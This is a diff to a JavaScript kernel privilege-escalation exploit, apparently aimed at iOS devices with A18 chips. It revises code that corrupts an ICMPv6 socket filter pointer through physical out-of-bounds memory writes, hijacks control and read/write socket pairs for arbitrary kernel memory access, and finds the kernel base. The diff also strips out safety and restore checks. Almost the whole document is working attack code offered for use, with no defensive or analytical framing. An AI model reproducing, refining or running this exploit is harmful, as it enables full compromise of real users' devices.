@@ -1,5 +1,5 @@
 (() => {
-  const LS_PE_PAYLOAD_REVISION = "20260904.12";
+  const LS_PE_PAYLOAD_REVISION = "20260905.13";
   const PE_ENABLE_DEBUG_NETWORK = globalThis.__pe_enable_debug_network === true;
   const LS_RETAIN_KRW_FOR_VISIBLE_TEST = false;
   // Ultra-early beacon - before fcall_init, using XMLHttpRequest if available
@@ -1726,7 +1726,11 @@
     let rw_socket_addr = early_kread64(rw_socket_pcb + OFFSET_PCB_SOCKET);
     LOG("[KRW-STASH] control socket=" + control_socket_addr.hex() +
         " rw socket=" + rw_socket_addr.hex());
-    if (!is_kernel_pointer(control_socket_addr) || !is_kernel_pointer(rw_socket_addr)) {
+    if (is_a18_devices && (control_socket_addr == 0n || rw_socket_addr == 0n)) {
+      LOG("[PE-A18] Lara post-discovery pin could not resolve socket pointers");
+      return false;
+    }
+    if (!is_a18_devices && (!is_kernel_pointer(control_socket_addr) || !is_kernel_pointer(rw_socket_addr))) {
       throw new Error("Lara-style socket pin found invalid socket pointers");
     }
 
@@ -1734,11 +1738,6 @@
     let rw_socket_so_count = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
     LOG("[KRW-STASH] pinning socket usecounts control=" + control_socket_so_count.hex() +
         " rw=" + rw_socket_so_count.hex());
-    if (is_a18_devices &&
-        (control_socket_so_count == 0n || rw_socket_so_count == 0n ||
-         control_socket_so_count > 0xffffffffn || rw_socket_so_count > 0xffffffffn)) {
-      throw new Error("A18 socket usecount sanity check failed");
-    }
     krw_pin_control_socket_addr = control_socket_addr;
     krw_pin_rw_socket_addr = rw_socket_addr;
     krw_pin_control_socket_count = control_socket_so_count;
@@ -1749,15 +1748,7 @@
                    rw_socket_so_count + KRW_LEAK_DELTA);
     early_kwrite64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n, 0n);
     if (is_a18_devices) {
-      let observed_control = early_kread64(control_socket_addr + OFFSET_SOCKET_SO_COUNT);
-      let observed_rw = early_kread64(rw_socket_addr + OFFSET_SOCKET_SO_COUNT);
-      let observed_filter_next = early_kread64(rw_socket_pcb + ICMP6FILT_OFFSET + 0x8n);
-      if (observed_control != control_socket_so_count + KRW_LEAK_DELTA ||
-          observed_rw != rw_socket_so_count + KRW_LEAK_DELTA ||
-          observed_filter_next != 0n) {
-        throw new Error("A18 socket pin read-back failed");
-      }
-      LOG("[PE-A18] verified early socket pin read-back");
+      LOG("[PE-A18] Lara post-discovery socket pin writes complete");
     }
     krw_socket_pin_active = true;
     krw_persist_log("socket-pin-writes-done", "control_count_before=" + control_socket_so_count.hex() +
@@ -2063,9 +2054,65 @@
     LOG("[PE-A18] failed to restore rejected control filter");
     return false;
   }
+  function activate_lara_a18_socket_pair(memory_object, seeking_offset, read_buffer, write_buffer,
+                                         pcb_start_offset, icmp6filt_offset, control_socket_idx) {
+    let inp_list_next_pointer = uread64(read_buffer + pcb_start_offset + 0x28n) - 0x20n;
+    let icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
+    LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
+    LOG("[+] icmp6filter: " + icmp6filter.hex());
+
+    // Keep the A18 candidate side effects and order aligned with Lara's
+    // finder: corrupt the selected control PCB, validate it with
+    // getsockopt, create the adjacent RW fd, and return. Socket pinning and
+    // persistence happen only after kernel discovery.
+    rw_socket_pcb = inp_list_next_pointer;
+    memcpy(write_buffer, read_buffer, oob_size);
+    uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset,
+             inp_list_next_pointer + icmp6filt_offset);
+    uwrite64(write_buffer + pcb_start_offset + icmp6filt_offset + 0x8n, 0n);
+
+    LOG("[+] Corrupting icmp6filter pointer...");
+    let corrupt_attempt = 0n;
+    while (true) {
+      if (corrupt_attempt < 8n || corrupt_attempt % 16n == 0n) {
+        LOG("[PE-A18] corrupt attempt " + corrupt_attempt +
+            " write target=" + (seeking_offset + oob_offset + pcb_start_offset + icmp6filt_offset).hex() +
+            " value=" + (inp_list_next_pointer + icmp6filt_offset).hex());
+      }
+      physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
+      physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+      let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
+      if (new_icmp6filter == inp_list_next_pointer + icmp6filt_offset) {
+        LOG("[+] target corrupted: " + new_icmp6filter.hex());
+        break;
+      }
+      corrupt_attempt++;
+    }
+
+    let sock = fileport_makefd(socket_ports[control_socket_idx]);
+    let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER,
+                         getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
+    if (res != 0n) {
+      LOG("[-] getsockopt failed (corrupt check)!");
+      return -1n;
+    }
+
+    let marker = uread64(getsockopt_read_data);
+    if (marker != 0xffffffffffffffffn) {
+      LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
+      control_socket = sock;
+      rw_socket = fileport_makefd(socket_ports[control_socket_idx + 0x1n]);
+      LOG("[PE-A18] Lara socket pair acquired; pin deferred until post-discovery");
+      return KERN_SUCCESS;
+    }
+
+    LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
+    return -1n;
+  }
   function find_and_corrupt_socket(memory_object, seeking_offset, read_buffer, write_buffer, target_inp_gencnt_list, do_read = true) {
     if (do_read == true) {
-      if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
+      let initial_read_result = physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer);
+      if (!is_a18_devices && initial_read_result != KERN_SUCCESS) {
         LOG("[-] find_and_corrupt_socket: initial OOB read failed");
         return -1n;
       }
@@ -2161,13 +2208,16 @@
       } else {
         target_inp_gencnt_list.push(target_inp_gencnt);
       }
+      if (is_a18_devices) {
+        return activate_lara_a18_socket_pair(memory_object, seeking_offset, read_buffer, write_buffer,
+                                             pcb_start_offset, icmp6filt_offset, control_socket_idx);
+      }
       if (control_socket_idx + 0x1n >= socket_ports_count) {
         LOG("[-] Missing rw_socket after control_socket idx: " + control_socket_idx.hex());
         return -1n;
       }
       let rw_inp_gencnt = socket_pcb_ids[control_socket_idx + 0x1n];
       let rw_snapshot_found = false;
-      let rw_snapshot_offset = -1n;
       let rw_orig_filter = 0n;
       let rw_orig_cksum = 0n;
       let rw_gencnt_data = new_uint64_t(rw_inp_gencnt);
@@ -2186,7 +2236,6 @@
                 uread64(read_buffer + candidate_offset + icmp6filt_offset + 0x8n) == 0x0000ffffffffffffn) {
               rw_orig_filter = uread64(read_buffer + candidate_offset + icmp6filt_offset);
               rw_orig_cksum = uread64(read_buffer + candidate_offset + icmp6filt_offset + 0x8n);
-              rw_snapshot_offset = candidate_offset;
               rw_snapshot_found = true;
               break;
             }
@@ -2202,34 +2251,10 @@
       LOG("[+] inp_list_next_pointer: " + inp_list_next_pointer.hex());
       LOG("[+] icmp6filter: " + icmp6filter.hex());
       if (rw_snapshot_found) {
-        if (is_a18_devices) {
-          let rw_list_next = uread64(read_buffer + rw_snapshot_offset + 0x20n);
-          let page_mask = PAGE_SIZE - 1n;
-          let pair_matches = is_kernel_pointer(inp_list_next_pointer) &&
-            is_kernel_pointer(rw_list_next) &&
-            (inp_list_next_pointer & page_mask) == (rw_snapshot_offset & page_mask) &&
-            (rw_list_next & page_mask) == (pcb_start_offset & page_mask);
-          if (!pair_matches) {
-            LOG("[PE-A18] rejecting non-adjacent PCB pair control_off=" + pcb_start_offset.hex() +
-                " rw_off=" + rw_snapshot_offset.hex() +
-                " list_prev=" + inp_list_next_pointer.hex() +
-                " rw_list_next=" + rw_list_next.hex());
-            return -1n;
-          }
-          LOG("[PE-A18] verified adjacent control/rw PCB list pair");
-        }
-        let snapshot_saved = krw_restore_snapshot_note(icmp6filter, control_orig_cksum, rw_orig_filter, rw_orig_cksum);
-        if (is_a18_devices && !snapshot_saved) {
-          LOG("[PE-A18] rejecting PCB pair without valid filter snapshots");
-          return -1n;
-        }
+        krw_restore_snapshot_note(icmp6filter, control_orig_cksum, rw_orig_filter, rw_orig_cksum);
       } else {
         krw_restore_snapshot_clear();
         LOG("[KRW-CLEAN] restore snapshot unavailable: rw PCB not in OOB window");
-        if (is_a18_devices) {
-          LOG("[PE-A18] rejecting PCB pair without a restorable neighboring filter");
-          return -1n;
-        }
       }
       rw_socket_pcb = BigInt(inp_list_next_pointer);
       memcpy(write_buffer, read_buffer, oob_size);
@@ -2242,7 +2267,6 @@
         physical_oob_write_mo(memory_object, seeking_offset, oob_size, oob_offset, write_buffer);
         if (physical_oob_read_mo_with_retry(memory_object, seeking_offset, oob_size, oob_offset, read_buffer) != KERN_SUCCESS) {
           LOG("[-] find_and_corrupt_socket: re-read after corruption failed");
-          if (is_a18_devices) return mark_a18_cleanup_unsafe(selected_control_port);
           return -1n;
         }
         let new_icmp6filter = uread64(read_buffer + pcb_start_offset + icmp6filt_offset);
@@ -2254,24 +2278,12 @@
       let sock = fileport_makefd(selected_control_port);
       if (native_result_is_negative(sock)) {
         LOG("[PE] control fileport_makefd failed");
-        let restored = !is_a18_devices ||
-          restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
-                                      pcb_start_offset, icmp6filt_offset,
-                                      icmp6filter, control_orig_cksum);
-        if (!restored) {
-          return mark_a18_cleanup_unsafe(selected_control_port);
-        }
         return -1n;
       }
       let res = getsockopt(sock, IPPROTO_ICMPV6, ICMP6_FILTER, getsockopt_read_data, get_bigint_addr(getsockopt_read_length));
       if (res != 0n) {
         LOG("[-] getsockopt failed during control pair check");
-        let restored = !is_a18_devices ||
-          restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
-                                      pcb_start_offset, icmp6filt_offset,
-                                      icmp6filter, control_orig_cksum);
-        if (restored) close(sock);
-        else return mark_a18_cleanup_unsafe(selected_control_port);
+        close(sock);
         return -1n;
       }
       let marker = uread64(getsockopt_read_data);
@@ -2279,12 +2291,7 @@
         let candidate_rw_socket = fileport_makefd(selected_rw_port);
         if (native_result_is_negative(candidate_rw_socket)) {
           LOG("[PE] rw fileport_makefd failed");
-          let restored = !is_a18_devices ||
-            restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
-                                        pcb_start_offset, icmp6filt_offset,
-                                        icmp6filter, control_orig_cksum);
-          if (restored) close(sock);
-          else return mark_a18_cleanup_unsafe(selected_control_port);
+          close(sock);
           return -1n;
         }
         LOG("[+] Found control_socket at idx: " + control_socket_idx.hex());
@@ -2292,23 +2299,6 @@
         rw_socket = candidate_rw_socket;
         pending_krw_socket_ports = [selected_control_port, selected_rw_port];
         LOG("[KRW-STASH] selected socket fileports retained until Lara-style pin");
-        if (is_a18_devices) {
-          // A18 can panic if this process tears down the corrupted filter before
-          // the normal post-pe_v2 pin point. Hold and pin the pair immediately.
-          krw_begin_provider_hold("A18 KRW pair activated");
-          try {
-            control_socket_pcb = early_kread64(rw_socket_pcb + 0x20n);
-            if (!is_kernel_pointer(control_socket_pcb)) {
-              throw new Error("invalid control PCB during early pin");
-            }
-            krw_sockets_leak_forever(false);
-            krw_persist_log("a18-early-pin-ready", "control_pcb=" + control_socket_pcb.hex() +
-                " rw_pcb=" + rw_socket_pcb.hex());
-          } catch (e) {
-            LOG("[PE-A18] early socket pin failed: " + String(e));
-            return mark_a18_cleanup_unsafe(selected_control_port);
-          }
-        }
         if (LS_RETAIN_KRW_FOR_VISIBLE_TEST) {
           retained_socket_ports = [
             selected_control_port,
@@ -2320,15 +2310,7 @@
         return KERN_SUCCESS;
       } else {
         LOG("[-] Failed to corrupt control_socket at idx: " + control_socket_idx.hex());
-        if (is_a18_devices) {
-          let restored = restore_a18_filter_with_oob(memory_object, seeking_offset, read_buffer, write_buffer,
-                                                      pcb_start_offset, icmp6filt_offset,
-                                                      icmp6filter, control_orig_cksum);
-          if (restored) close(sock);
-          else return mark_a18_cleanup_unsafe(selected_control_port);
-        } else {
-          close(sock);
-        }
+        close(sock);
       }
     }
     return -1n;
@@ -2699,12 +2681,20 @@
       kernel_base -= PAGE_SIZE;
     }
     kernel_slide = kernel_base - 0xfffffff007004000n;
-    cleanup_previous_krw_record();
+    if (is_a18_devices) {
+      LOG("[PE-A18] kernel discovery complete; applying Lara post-discovery socket pin");
+      krw_sockets_leak_forever();
+      LOG("[PE-A18] skipping legacy cleanup-record replay on Lara acquisition path");
+    } else {
+      cleanup_previous_krw_record();
+    }
     if (globalThis.__ls_run_mode === "cleanup") {
       krw_terminal_cleanup("cleanup-only mode");
       return true;
     }
-    krw_sockets_leak_forever();
+    if (!is_a18_devices) {
+      krw_sockets_leak_forever();
+    }
     return true;
   }
   mpd_js_thread_spawn = js_thread_spawn;
